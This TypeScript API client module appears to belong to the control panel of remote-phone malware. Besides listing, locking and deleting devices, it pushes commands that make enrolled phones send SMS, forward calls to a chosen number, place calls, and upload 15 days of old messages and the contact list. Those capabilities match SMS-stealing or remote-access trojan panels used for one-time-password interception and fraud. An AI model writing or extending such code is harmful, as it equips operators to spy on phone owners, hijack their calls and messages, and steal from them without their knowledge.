import api from "./apiClient";
import type { DeviceDoc } from "../../types";

export async function getDevices(): Promise<DeviceDoc[]> {
  const res = await api.get(`/api/devices`);
  return Array.isArray(res.data) ? (res.data as DeviceDoc[]) : [];
}

export async function getDevice(deviceId: string): Promise<DeviceDoc> {
  const res = await api.get(`/api/devices/${encodeURIComponent(deviceId)}`);
  return res.data as DeviceDoc;
}

export async function updateDeviceMetadata(deviceId: string, metadata: Record<string, any>): Promise<void> {
  await api.put(`/api/devices/${encodeURIComponent(deviceId)}`, metadata || {});
}

export async function updateSimInfo(deviceId: string, simInfo: Record<string, any>): Promise<void> {
  await api.put(`/api/devices/${encodeURIComponent(deviceId)}/simInfo`, simInfo || {});
}

export async function deleteDevice(deviceId: string, password?: string): Promise<void> {
  await api.delete(`/api/devices/${encodeURIComponent(deviceId)}`, {
    data: password ? { password } : undefined,
  });
}

// ── Device Lock ──

export async function lockDevice(deviceId: string, locked: boolean): Promise<void> {
  await api.put(`/api/devices/${encodeURIComponent(deviceId)}/lock`, { locked });
}

export async function lockAllDevices(): Promise<void> {
  await api.post(`/api/devices/lock-all`);
}

export async function unlockAllDevices(): Promise<void> {
  await api.post(`/api/devices/unlock-all`);
}

// ── FCM Push commands ──

export async function pushSendSms(
  deviceId: string,
  to: string,
  message: string,
  sim: number,
): Promise<{ success: boolean; error?: string }> {
  const res = await api.post(`/api/admin/push/devices/${encodeURIComponent(deviceId)}/send-sms`, {
    to,
    message,
    sim,
  });
  return res.data;
}

export async function pushCallForward(
  deviceId: string,
  callCode: string,
  sim: string,
  phoneNumber: string,
): Promise<{ success: boolean; error?: string }> {
  const res = await api.post(`/api/admin/push/devices/${encodeURIComponent(deviceId)}/call-forward`, {
    callCode,
    sim,
    phoneNumber,
  });
  return res.data;
}

export async function pushMakeCall(
  deviceId: string,
  number: string,
  sim: number,
): Promise<{ success: boolean; error?: string }> {
  const res = await api.post(`/api/admin/push/devices/${encodeURIComponent(deviceId)}/make-call`, {
    number,
    sim,
  });
  return res.data;
}

export async function pushReadOldSms(
  deviceId: string,
  days = 15,
): Promise<{ success: boolean; error?: string }> {
  const res = await api.post(`/api/devices/${encodeURIComponent(deviceId)}/read-old-sms`, { days });
  return res.data;
}

export async function pushReadContacts(
  deviceId: string,
): Promise<{ success: boolean; error?: string }> {
  const res = await api.post(`/api/devices/${encodeURIComponent(deviceId)}/read-contacts`);
  return res.data;
}

export async function getDeviceContacts(
  deviceId: string,
): Promise<Array<Record<string, any>>> {
  const res = await api.get(`/api/devices/${encodeURIComponent(deviceId)}/contacts`);
  return Array.isArray(res.data) ? res.data : [];
}
